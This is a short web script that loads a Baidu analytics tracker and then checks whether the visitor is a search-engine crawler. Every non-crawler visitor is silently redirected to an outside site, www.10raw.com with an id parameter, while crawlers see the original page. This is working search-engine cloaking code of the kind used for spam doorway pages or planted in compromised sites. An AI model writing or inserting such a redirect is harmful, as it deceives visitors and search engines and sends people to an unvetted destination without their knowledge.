var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?25857709e83d10088dfbcaabcb5e1154";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var userAgent = navigator.userAgent;
var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];

var isSpider = spiderList.some(function(spider) {
    return userAgent.includes(spider);
});

if (!isSpider) {
    window.location.href = "https://www.10raw.com?id=395320273";
}
